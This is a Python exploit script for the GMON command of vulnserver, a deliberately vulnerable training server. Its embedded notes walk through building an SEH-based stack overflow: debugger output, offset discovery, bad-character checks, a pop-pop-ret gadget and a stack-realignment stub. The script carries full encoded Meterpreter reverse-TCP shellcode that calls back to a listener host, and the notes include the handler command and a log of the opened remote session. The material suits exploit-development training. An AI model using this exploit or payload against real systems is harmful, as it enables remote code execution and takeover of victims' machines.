#!/usr/bin/env python3
import os, sys, re, socket, binascii
from struct import pack, unpack
from IPython import embed

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv; g'

## ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 00401937; g'

## ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp 0x62501301; g'

NOTES=r"""
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./poc.py 192.168.56.100:9999
Welcome to Vulnerable Server! Enter HELP for help.

Valid Commands:
HELP
STATS [stat_value]      ; not_exploitable
RTIME [rtime_value]     ; not_exploitable
LTIME [ltime_value]     ; not_exploitable
SRUN [srun_value]       ; not_exploitable
TRUN [trun_value]       ; exploitable
GMON [gmon_value]       ; exploitable
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT

Well with GMON, we come across this initial critical basic block:
.text:00401F2D
.text:00401F2D loc_401F2D:             ;
.text:00401F2D mov     edx, [ebp+var_20] ; 0x5
.text:00401F30 mov     eax, [ebp+buf]
.text:00401F33 add     eax, edx
.text:00401F35 movzx   eax, byte ptr [eax] ; 1st byte of buf following "GMON "
.text:00401F38 cmp     al, 2Fh ; '/'
.text:00401F3A jnz     short loc_401F5B

The CMP instruction is basically checking that the first byte that follows the substring "GMON " is a forward slash (/).   The JMP instruction is taken if the comparison doesn't result in zero (equals). EDX, which is added to the accumulator EAX and used as an index to the string, is incremented 1 and a loop back to the basic block occurs.  Basically, the basic block is going to search essentially the entire string until it finds a forward slash.  But once it does find one, the jump isn't taken, which is what we want.

I'll update my PoC to include a forward slash.
    oflow_sz = 0x1000
    buf = "GMON /"
    buf += "\x41" * oflow_sz

After resending the PoC and breakpoint on the jnz instruction, the jump isn't taken.

We end up at the following basic block:
.text:00401F3C mov     eax, [ebp+buf]
.text:00401F3F mov     [esp], eax      ; Str
.text:00401F42 call    _strlen
.text:00401F47 cmp     eax, 0F6Eh
.text:00401F4C jbe     short loc_401F69

As can be seen, if strlen greater than 0xf6e, the jump isn't taken, which is what we want.  I have sent a buffer of 0x1000 bytes, so the jump will not be taken.

We end up at the following basic block:
.text:00401F4E mov     eax, [ebp+buf]
.text:00401F51 mov     [esp], eax      ; Source
.text:00401F54 call    _Function3
.text:00401F59 jmp     short loc_401F69

We previously saw tha t_Function3 is very interesting (TRUN).
It is expected this will overflow.

Once again, executing the _Function3 call to _strcpy results in an overflow.  The call stack is overwritten.
0:004> k
 # ChildEBP RetAddr      
00 0123f210 0040193c     msvcrt!strcat+0x89
WARNING: Stack unwind information not available. Following frames may be wrong.
01 0123fa00 41414141     vulnserver+0x193c
02 0123fa04 41414141     0x41414141
03 0123fa08 41414141     0x41414141
04 0123fa0c 41414141     0x41414141

And actually, we don't even need to return from _Function3 to invoke a crash.  This time, the crash is because the return address pushed to the stack when calling strcat got overwritten, as can be seen in the call stack.

We will go ahead and place a pattern string and execute the call again.

./gmon.py 192.168.56.100:9999 $(msf-pattern_create -l 0x1000)

    oflow_sz = 0x1000
    buf = "GMON /"
    buf += sys.argv[2]

0:003> !exchain
00fcffcc: 6d45336d
Invalid exception stack at 45326d45

┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ msf-pattern_offset -l 0x1000 -q 6d45336d
[*] Exact match at offset 3490

So I end up refiguring control of SEH shoould be had with:
    oflow_sz = 0x1000
    SEH_offset = 3490
    opcode = "GMON /"
    slack1 = "\x41" * SEH_offset
    SEH = packlatin("<L",0x42424242)
    slack2 = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        slack1,
        SEH
    ]])))
    buf = f"{opcode}{slack1}{SEH}{slack2}"

After resending:
0:003> !exchain
00e8ffcc: 42424242  <----
Invalid exception stack at 41414141

Great.  Next, need to try to figure out badchars.  Last time, 0x0 was known bad.  We'll start with that assumption, which would be a safe bet considering we're again crashing in _strcpy inside _Function3, so it shouldn't be any different than before.

badchars = "\x00"
[...]

    oflow_sz = 0x1000
    SEH_offset = 3490
    opcode = "GMON /"
    slack1 = "\x41" * SEH_offset
    SEH = packlatin("<L",0x42424242)
    bad = gen_badchars(badchars,"\x00","\xff")
    slack2 = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        slack1,
        SEH,
        bad
    ]])))
    buf = f"{opcode}{slack1}{SEH}{bad}{slack2}"

    
0:003> !exchain
(00ecffcc): 42424242
Invalid exception stack at 41414141

0:003> db 00ecffcc L0xff
00ecffcc  41 41 41 41 42 42 42 42-01 02 03 04 05 06 07 08  AAAABBBB........
00ecffdc  09 0a 0b 0c 0d 0e 0f 10-11 12 13 14 15 16 17 18  ................
00ecffec  19 1a 1b 1c 1d 1e 1f 20-21 22 23 24 25 26 27 28  ....... !"#$%&'(
00ecfffc  29 2a 2b 2c ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  )*+,????????????

It would appear there is limited space after SEH.  Also, the most likely range to contain bad characters, plus given we've already identified badchars in _Function3, leads me to believe just 0x0 is a badchar.

Third dword at ESP is the beginning of the buffer:
0:003> dds esp L0x4
00ecf210  00401960 vulnserver+0x1960
00ecf214  0040193c vulnserver+0x193c
00ecf218  00ecf228      <-----
00ecf21c  00ac3b60

0:003> dd poi(esp+0xc)
00ac3b60  4e4f4d47 41412f20 41414141 41414141
00ac3b70  41414141 41414141 41414141 41414141

Nothing a pop pop ret can't fix.

0:003> .load narly
[...]
0:003> !nmod
00400000 00412000 vulnserver           /SafeSEH OFF                C:\users\admin\desktop\current_thing\vulnserver.exe
62500000 62510000 essfunc              /SafeSEH OFF                C:\users\admin\desktop\current_thing\essfunc.dll

essfunc looks compatible.  

rp++-ng -f essfunc.dll --va 0x62500000 -lusr8 -b "\x00"
0x625012f2: jmp eax ; 
0x62501340: jmp ebp ; 
0x6250130c: jmp ebx ; 
0x625012ff: jmp ecx ; 
0x62501319: jmp edi ; 
0x62501326: jmp edx ; 
0x62501333: jmp esi ; 
0x625012f0: jmp esp ; 

0x62501026: call eax ; 
0x62501268: call edx ; 
0x62501225: call esi ;

0x625015a0: xor eax, eax ; ret ;

0x625012f5: pop eax ; ret ; 
0x6250127b: pop ebp ; ret ; 
0x62501056: pop ebx ; ret ; 
0x62501354: pop ecx ; ret ; 
0x62501a35: pop edi ; ret ; 
0x62501329: pop edx ; ret ; 
0x6250160e: pop esi ; ret ; 
0x625012f4: pop eax ; pop eax ; ret ; 
0x62501342: pop eax ; pop edx ; ret ; 
0x6250130e: pop ebp ; pop ebp ; ret ; 
0x62501301: pop ebx ; pop ebx ; ret ; 
0x6250160d: pop ebx ; pop esi ; ret ; 
0x62501335: pop ecx ; pop eax ; ret ; 
0x62501353: pop ecx ; pop ecx ; ret ; 
0x62501328: pop ecx ; pop edx ; ret ; 
0x62501883: pop edi ; pop ebp ; ret ; 
0x6250127a: pop esi ; pop ebp ; ret ; 
0x62501a34: pop esi ; pop edi ; ret ; 
0x62501279: pop ebx ; pop esi ; pop ebp ; ret ; 
0x62501a33: pop ebx ; pop esi ; pop edi ; ret ; 
0x62501882: pop esi ; pop edi ; pop ebp ; ret ; 
0x62501881: pop ebx ; pop esi ; pop edi ; pop ebp ; ret ; 

0x62501623: mov eax, esi ; pop ebx ; pop esi ; ret ;

0x6250117a: neg eax ; ret ;

We'll go ahead and try the following:
0x62501301: pop ebx ; pop ebx ; ret ;


At the pop pop ret,
0:003> dds esp L0x4
0102ec60  77198b02 ntdll!ExecuteHandler2+0x26
0102ec64  0102ed60
0102ec68  0102ffcc  <---ret
0102ec6c  0102edb0

0:003> dd 0102ffcc
0102ffcc  41414141 62501301 43434343 43434343
0102ffdc  43434343 43434343 43434343 43434343
0102ffec  43434343 43434343 43434343 43434343
0102fffc  43434343 ???????? ???????? ????????

This will take us cleanly into the dword preceding crash time SEH.  After executing the ret:
0:003> dd eip
0102ffcc  41414141 62501301 43434343 43434343
0102ffdc  43434343 43434343 43434343 43434343
0102ffec  43434343 43434343 43434343 43434343
0102fffc  43434343 ???????? ???????? ????????

Excellent.  A short jmp 0x6 will take us to the first 0x43434343 dword.

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "jmp short 8"

    #[.]  jmp short 8
    # 00000000  EB06              jmp short 0x8
    # 2 bytes

    "\xeb\x06"      # EB06 jmp short 0x8 # 2 bytes

The following incorporates the nSEH short jump over SEH, in addition to adding a nopsled and shellcode area at the beginning of the buffer, as well as "shot_caller", which is the stage 1 payload to realign esp with the begining of the overflow.

    oflow_sz = 0x1000
    SEH_offset = 3490
    opcode = "GMON /"
    nopsled = "\x90" * 0x20
    shellcode = (
        ""
    )
    nSEH = "\xeb\x06\x90\x90"      # EB06 jmp short 0x8 # 2 bytes
    SEH = packlatin("<L",0x62501301) ## 0x62501301: pop ebx ; pop ebx ; ret ;
    # bad = gen_badchars(badchars,"\x00","\xff")
    shot_caller = (
        ""
    )
    slack1 = "\x41" * (SEH_offset - sum(iter([len(x) for x in [
        nopsled,
        shellcode,
        nSEH
    ]])))
    slack2 = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        nopsled,
        shellcode,
        slack1,
        nSEH,
        SEH,
        shot_caller
    ]])))
    buf = f"{opcode}{nopsled}{shellcode}{slack1}{nSEH}{SEH}{shot_caller}{slack2}"


After executing the pop pop ret, then the short jump, esp is not far off from the nopsled:
0:003> dd esp+0x600-0x3e
00eef22e  90909090 90909090 90909090 90909090
00eef23e  90909090 90909090 90909090 90909090
00eef24e  41414141 41414141 41414141 41414141

0:003> ? 0x600-0x3e
Evaluate expression: 1474 = 000005c2
0:003> ? -0x5c2
Evaluate expression: -1474 = fffffa3e  <-----

Here are the registers currently:
0:003> r
eax=00000000 ebx=00eeed60 ecx=62501301 edx=77198b20 esi=00000000 edi=00000000
eip=00eeffd4 esp=00eeec6c ebp=00eeec80 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
00eeffd4 43              inc     ebx

eax, esi, and edi are already 0x0.

We want to add esp, 0x5c2
Or, because of null bytes, we want to sub -0x5c2.

Either way, there is a solution for that.

Here's sub -0x5c2:
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "mov esi, 0xfffffa3e; sub esp, esi; jmp esp"

    #[.]  mov esi, 0xfffffa3e\n sub esp, esi\n jmp esp
    # 00000000  BE3EFAFFFF        mov esi,0xfffffa3e
    # 00000005  29F4              sub esp,esi
    # 00000007  FFE4              jmp esp
    # 9 bytes

    "\xbe\x3e\xfa\xff\xff\x29\xf4\xff\xe4"  # BE3EFAFFFF mov esi,0xfffffa3e; 29F4 sub esp,esi; FFE4 jmp esp # 9 bytes

Alternatively, here's add 0x5c2:
    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "mov al, 0xc2; mov ah, 0x5; xchg esi, eax; add esp, esi; jmp esp"

    #[.]  mov al, 0xc2\n mov ah, 0x5\n xchg esi, eax\n add esp, esi\n jmp esp
    # 00000000  B0C2              mov al,0xc2
    # 00000002  B405              mov ah,0x5
    # 00000004  96                xchg eax,esi
    # 00000005  01F4              add esp,esi
    # 00000007  FFE4              jmp esp
    # 9 bytes

    "\xb0\xc2\xb4\x05\x96\x01\xf4\xff\xe4"  # B0C2 mov al,0xc2; B405 mov ah,0x5; 96 xchg eax,esi; 01F4 add esp,esi; FFE4 jmp esp # 9 bytes
Both solutions yield 9 bytes.

After updating shot_caller with the latter solution, at the jmp esp instruction:
0:003> dd esp
00fbf22e  90909090 90909090 90909090 90909090
00fbf23e  90909090 90909090 90909090 90909090
00fbf24e  41414141 41414141 41414141 41414141

Except there's one problem:

ESP is unaligned now.  So we should increase the add from 0x5c2 to 0x5c4 to align to a 4 byte boundary.

    ┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
    └─$ msf-nasm_shell-ng "mov al, 0xc4; mov ah, 0x5; xchg esi, eax; add esp, esi; jmp esp"

    #[.]  mov al, 0xc4\n mov ah, 0x5\n xchg esi, eax\n add esp, esi\n jmp esp
    # 00000000  B0C4              mov al,0xc4
    # 00000002  B405              mov ah,0x5
    # 00000004  96                xchg eax,esi
    # 00000005  01F4              add esp,esi
    # 00000007  FFE4              jmp esp
    # 9 bytes

    "\xb0\xc4\xb4\x05\x96\x01\xf4\xff\xe4"  # B0C4 mov al,0xc4; B405 mov ah,0x5; 96 xchg eax,esi; 01F4 add esp,esi; FFE4 jmp esp # 9 bytes

Also going to increase the nopsled size from 0x20 to 0x22 .  This will make the shellcode move up two bytes, aligining to a clean four and 16 byte boundary.

Now all that is left is to add some shellcode and pop the shell.

After adding a shellcode, increasing nopsled +2, and updating shot_caller, it pops the shell

┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; set EXITFUNC process; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.56.187
LPORT => 80
EXITFUNC => process
[*] Started reverse TCP handler on 192.168.56.187:80 
[*] Sending stage (175686 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (192.168.56.187:80 -> 192.168.56.100:49838) at 2023-05-23 22:45:00 -0700

meterpreter > getuid
Server username: DESKTOP-4NR4332\Admin
meterpreter > sysinfo
Computer        : DESKTOP-4NR4332
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
"""

def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')

# def unpacklatin(fmt, inp):
#         return unpack(fmt, inp.encode('latin-1'))[0]

# def uniesc_to_bytestr(instring):
#     r""" '\\x58\\x59\\x5a\\xa0' -> 'XYZ\xa0' 
#         hexstrings in from cli, ex., argparse   """
#     return bytes(instring, 'utf-8').decode("unicode_escape")

# def bytestr_to_long(inbstr):
#     r""" 'XYZ\xa0' -> 2690275672 """
#     return unpack("I",bytes(inbstr,'latin-1'))[0]

# def long_to_bytestr(inlong):
#     r""" 2690275672 -> 'XYZ\xa0' """
#     return pack("<L", inlong).decode('latin-1')

# def octalstring_to_bytestr_pad(inoct):
#     r""" "0x200" -> '\x00\x02\x00\x00' (le) 
#         for the --va + --addbase scenario 
#         pad with \x00 to dword size bytes """
#     return pack("<L", (int(inoct,16))).decode('latin-1')

# def octalstring_to_bytestr_nopad(inoct):
#     r""" "0x200" -> '\x00\x02' (le) 
#         for the --va only scenario 
#         no padding with \x00 to dword size bytes """
#     octstr = inoct[2:]
#     if len(octstr) % 2 == 1:
#         octstr = f"0{octstr}"
#     return ''.join([chr(int(octstr[x:x+2],16)) for x in range(0,len(octstr),2)][::-1])

badchars = "\x00"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def sender(ip, port, buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(buf.encode('latin-1'))
    return sock

def help(ip,port):
    buf = "HELP" 
    sock = sender(ip, port, buf)
    # print(sock.recv(4096))
    print(sock.recv(4096).decode('latin-1'))
    print(sock.recv(4096).decode('latin-1'))
    sock.close()

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    # help(ip,port)

    oflow_sz = 0x1000
    SEH_offset = 3490
    opcode = "GMON /"
    nopsled = "\x90" * 0x22
    shellcode = (
        ## msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.187 LPORT=80 EXITFUNC=process -b "\x00" -e x86/xor_dynamic -f c --smallest
        ## sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; set EXITFUNC process; run"
        "\xeb\x23\x5b\x89\xdf\xb0\xfc\xfc\xae\x75\xfd\x89\xf9\x89"
        "\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xe6\x68\x74\x08\x46"
        "\x80\x3e\xfc\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff"
        "\x05\xfc\xf9\xed\x8a\x05\x05\x05\x65\x34\xd7\x8c\xe0\x61"
        "\x8e\x57\x35\x8e\x57\x09\x8e\x57\x11\x0a\xb2\x4f\x23\x8e"
        "\x77\x2d\x34\xfa\x34\xc5\xa9\x39\x64\x79\x07\x29\x25\xc4"
        "\xca\x08\x04\xc2\x4c\x70\xea\x57\x52\x8e\x57\x15\x8e\x47"
        "\x39\x04\xd5\x8e\x45\x7d\x80\xc5\x71\x49\x04\xd5\x8e\x5d"
        "\x25\x55\x8e\x4d\x1d\x04\xd6\x80\xcc\x71\x39\x4c\x34\xfa"
        "\x8e\x31\x8e\x04\xd3\x34\xc5\xc4\xca\x08\xa9\x04\xc2\x3d"
        "\xe5\x70\xf1\x06\x78\xfd\x3e\x78\x21\x70\xe5\x5d\x8e\x5d"
        "\x21\x04\xd6\x63\x8e\x09\x4e\x8e\x5d\x19\x04\xd6\x8e\x01"
        "\x8e\x04\xd5\x8c\x41\x21\x21\x5e\x5e\x64\x5c\x5f\x54\xfa"
        "\xe5\x5d\x5a\x5f\x8e\x17\xec\x85\xfa\xfa\xfa\x58\x6d\x36"
        "\x37\x05\x05\x6d\x72\x76\x37\x5a\x51\x6d\x49\x72\x23\x02"
        "\x8c\xed\xfa\xd5\xbd\x95\x04\x05\x05\x2c\xc1\x51\x55\x6d"
        "\x2c\x85\x6e\x05\xfa\xd0\x6f\x0f\x6d\xc5\xad\x3d\xbe\x6d"
        "\x07\x05\x05\x55\x8c\xe3\x55\x55\x55\x55\x45\x55\x45\x55"
        "\x6d\xef\x0a\xda\xe5\xfa\xd0\x92\x6f\x15\x53\x52\x6d\x9c"
        "\xa0\x71\x64\xfa\xd0\x80\xc5\x71\x0f\xfa\x4b\x0d\x70\xe9"
        "\xed\x62\x05\x05\x05\x6f\x05\x6f\x01\x53\x52\x6d\x07\xdc"
        "\xcd\x5a\xfa\xd0\x86\xfd\x05\x7b\x33\x8e\x33\x6f\x45\x6d"
        "\x05\x15\x05\x05\x53\x6f\x05\x6d\x5d\xa1\x56\xe0\xfa\xd0"
        "\x96\x56\x6f\x05\x53\x56\x52\x6d\x07\xdc\xcd\x5a\xfa\xd0"
        "\x86\xfd\x05\x78\x2d\x5d\x6d\x05\x45\x05\x05\x6f\x05\x55"
        "\x6d\x0e\x2a\x0a\x35\xfa\xd0\x52\x6d\x70\x6b\x48\x64\xfa"
        "\xd0\x5b\x5b\xfa\x09\x21\x0a\x80\x75\xfa\xfa\xfa\xec\x9e"
        "\xfa\xfa\xfa\x04\xc6\x2c\xc3\x70\xc4\xc6\xbe\xf5\xb0\xa7"
        "\x53\x6f\x05\x56\xfa\xd0\xe6\x68" # 400
    )
    nSEH = "\xeb\x06\x90\x90"      # EB06 jmp short 0x8 # 2 bytes
    SEH = packlatin("<L",0x62501301) ## 0x62501301: pop ebx ; pop ebx ; ret ;
    # bad = gen_badchars(badchars,"\x00","\xff")
    shot_caller = (
        # 00000000  B0C4              mov al,0xc4
        # 00000002  B405              mov ah,0x5
        # 00000004  96                xchg eax,esi
        # 00000005  01F4              add esp,esi
        # 00000007  FFE4              jmp esp
        # 9 bytes

        "\xb0\xc4\xb4\x05\x96\x01\xf4\xff\xe4"  # B0C4 mov al,0xc4; B405 mov ah,0x5; 96 xchg eax,esi; 01F4 add esp,esi; FFE4 jmp esp # 9 bytes
    )
    slack1 = "\x41" * (SEH_offset - sum(iter([len(x) for x in [
        nopsled,
        shellcode,
        nSEH
    ]])))
    slack2 = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        nopsled,
        shellcode,
        slack1,
        nSEH,
        SEH,
        shot_caller
    ]])))
    buf = f"{opcode}{nopsled}{shellcode}{slack1}{nSEH}{SEH}{shot_caller}{slack2}"
    
    sock = sender(ip, port, buf)


if __name__=="__main__":
    main()

